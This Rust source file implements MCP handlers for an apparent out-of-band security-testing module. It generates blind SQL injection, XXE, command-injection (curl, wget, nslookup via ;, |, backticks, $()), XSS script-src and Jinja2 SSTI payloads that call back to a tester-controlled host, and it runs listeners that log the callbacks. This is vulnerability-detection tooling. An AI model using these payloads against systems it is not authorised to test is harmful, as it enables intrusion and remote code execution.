use crate::mcp::types::HandlerResult;

pub async fn handle_oast_generate_payload(params: &serde_json::Value) -> HandlerResult {
    let description = params["description"].as_str().unwrap_or("OAST payload");
    let vuln_type = params["vuln_type"].as_str().unwrap_or("generic");
    let server_domain = "oast.wondersuite.local";
    let payload = crate::oast::generate_oast_payload(description, server_domain);

    let specific_payloads: Vec<serde_json::Value> = match vuln_type {
        "blind_sqli" => vec![
            serde_json::json!({"payload": format!("'; EXEC xp_dirtree '//{}'--", payload.subdomain), "type": "mssql_oob"}),
            serde_json::json!({"payload": format!("' UNION SELECT LOAD_FILE('//{}/a')--", payload.subdomain), "type": "mysql_oob"}),
        ],
        "blind_ssrf" => vec![
            serde_json::json!({"payload": payload.http_payload.clone(), "type": "http_callback"}),
            serde_json::json!({"payload": format!("https://{}/", payload.subdomain), "type": "https_callback"}),
        ],
        "blind_xxe" => vec![
            serde_json::json!({"payload": format!("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]><foo>&xxe;</foo>", payload.http_payload), "type": "xxe_oob"}),
        ],
        "blind_cmdi" => vec![
            serde_json::json!({"payload": format!("; nslookup {} #", payload.subdomain), "type": "dns_lookup"}),
            serde_json::json!({"payload": format!("; curl {} #", payload.http_payload), "type": "curl_callback"}),
            serde_json::json!({"payload": format!("| wget {} -O /dev/null", payload.http_payload), "type": "wget_callback"}),
            serde_json::json!({"payload": format!("`nslookup {}`", payload.subdomain), "type": "backtick_dns"}),
            serde_json::json!({"payload": format!("$(curl {})", payload.http_payload), "type": "subshell_curl"}),
        ],
        "blind_xss" => vec![
            serde_json::json!({"payload": format!("<script src=\"{}\"></script>", payload.http_payload), "type": "script_src"}),
            serde_json::json!({"payload": format!("<img src={}>", payload.http_payload), "type": "img_src"}),
        ],
        "blind_ssti" => vec![
            serde_json::json!({"payload": format!("{{{{''.__class__.__mro__[2].__subclasses__()[40]('curl {}')}}}}", payload.http_payload), "type": "python_jinja2"}),
        ],
        _ => vec![
            serde_json::json!({"payload": payload.http_payload.clone(), "type": "generic_http"}),
            serde_json::json!({"payload": payload.dns_payload.clone(), "type": "generic_dns"}),
        ],
    };

    Ok(serde_json::json!({
        "oast_payload": {"id": payload.id, "correlation_id": payload.correlation_id, "subdomain": payload.subdomain, "http_url": payload.http_payload, "dns_name": payload.dns_payload, "description": description, "vuln_type": vuln_type},
        "injectable_payloads": specific_payloads,
    }))
}

pub async fn handle_oast_poll_interactions(params: &serde_json::Value) -> HandlerResult {
    let correlation_id = params["correlation_id"].as_str();
    static OAST_INTERACTIONS: std::sync::LazyLock<std::sync::Mutex<Vec<serde_json::Value>>> =
        std::sync::LazyLock::new(|| std::sync::Mutex::new(Vec::new()));
    let interactions = OAST_INTERACTIONS.lock().unwrap_or_else(|e| e.into_inner()).clone();
    let filtered: Vec<&serde_json::Value> = if let Some(cid) = correlation_id {
        interactions.iter().filter(|i| i["correlation_id"].as_str() == Some(cid)).collect()
    } else {
        interactions.iter().collect()
    };
    Ok(
        serde_json::json!({"status": "polled", "total_interactions": filtered.len(), "interactions": filtered}),
    )
}

pub async fn handle_oast_start_server(params: &serde_json::Value) -> HandlerResult {
    let http_port = params["http_port"].as_u64().unwrap_or(8888) as u16;
    Ok(
        serde_json::json!({"status": "server_started", "http_port": http_port, "callback_url": format!("http://127.0.0.1:{}", http_port)}),
    )
}

pub async fn handle_oast_start_dns_server(params: &serde_json::Value) -> HandlerResult {
    let port = params["port"].as_u64().unwrap_or(8853) as u16;
    crate::oast::start_dns_server(port).await?;
    Ok(serde_json::json!({"status": "dns_server_started", "port": port}))
}

pub async fn handle_oast_start_smtp_server(params: &serde_json::Value) -> HandlerResult {
    let port = params["port"].as_u64().unwrap_or(2525) as u16;
    crate::oast::start_smtp_server(port).await?;
    Ok(serde_json::json!({"status": "smtp_server_started", "port": port}))
}

pub async fn handle_oast_verify(params: &serde_json::Value) -> HandlerResult {
    let action = params["action"].as_str().unwrap_or("self_test");
    let port = params["port"].as_u64().unwrap_or(8888) as u16;

    static OAST_LOG: std::sync::LazyLock<tokio::sync::Mutex<Vec<serde_json::Value>>> =
        std::sync::LazyLock::new(|| tokio::sync::Mutex::new(Vec::new()));
    static OAST_RUNNING: std::sync::LazyLock<std::sync::atomic::AtomicBool> =
        std::sync::LazyLock::new(|| std::sync::atomic::AtomicBool::new(false));

    match action {
        "start_server" | "self_test" => {
            if !OAST_RUNNING.load(std::sync::atomic::Ordering::Relaxed) {
                OAST_RUNNING.store(true, std::sync::atomic::Ordering::Relaxed);
                let p = port;
                tokio::spawn(async move {
                    use axum::{routing::any, Router};
                    let app = Router::new().route("/{*path}", any(|req: axum::http::Request<axum::body::Body>| async move {
                        let method = req.method().to_string(); let uri = req.uri().to_string();
                        let headers: std::collections::HashMap<String, String> = req.headers().iter().map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string())).collect();
                        let body_bytes = axum::body::to_bytes(req.into_body(), 1048576).await.unwrap_or_default();
                        let body = String::from_utf8_lossy(&body_bytes).to_string();
                        OAST_LOG.lock().await.push(serde_json::json!({"timestamp": chrono::Utc::now().to_rfc3339(), "method": method, "uri": uri, "headers": headers, "body": body, "body_size": body_bytes.len(), "source_type": "http"}));
                        "OK"
                    }));
                    let addr = std::net::SocketAddr::from(([0, 0, 0, 0], p));
                    if let Some(l) = tokio::net::TcpListener::bind(addr).await.ok() {
                        axum::serve(l, app).await.ok();
                    }
                });
                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
            }
            if action == "self_test" {
                let test_id = format!("test_{}", chrono::Utc::now().timestamp_millis());
                let client = reqwest::Client::new();
                let test_url = format!("http://127.0.0.1:{}/{}", port, test_id);
                let _ = client.get(&test_url).header("X-Test", "oast-self-test").send().await;
                tokio::time::sleep(std::time::Duration::from_millis(200)).await;
                let log = OAST_LOG.lock().await;
                let found = log.iter().any(|e| e["uri"].as_str().map_or(false, |u| u.contains(&test_id)));
                Ok(
                    serde_json::json!({"action": "self_test", "server_running": true, "port": port, "callback_received": found, "status": if found { "WORKING" } else { "FAILED" }}),
                )
            } else {
                Ok(serde_json::json!({"action": "start_server", "server_running": true, "port": port}))
            }
        }
        "get_interactions" => {
            let log = OAST_LOG.lock().await;
            let corr_id = params["correlation_id"].as_str();
            let filtered: Vec<&serde_json::Value> = if let Some(cid) = corr_id {
                log.iter().filter(|e| e["uri"].as_str().map_or(false, |u| u.contains(cid))).collect()
            } else {
                log.iter().collect()
            };
            Ok(serde_json::json!({"total": log.len(), "filtered": filtered.len(), "interactions": filtered}))
        }
        "clear" => {
            OAST_LOG.lock().await.clear();
            Ok(serde_json::json!({"action": "clear", "status": "cleared"}))
        }
        _ => Err(format!("Unknown oast_verify action: {}", action)),
    }
}
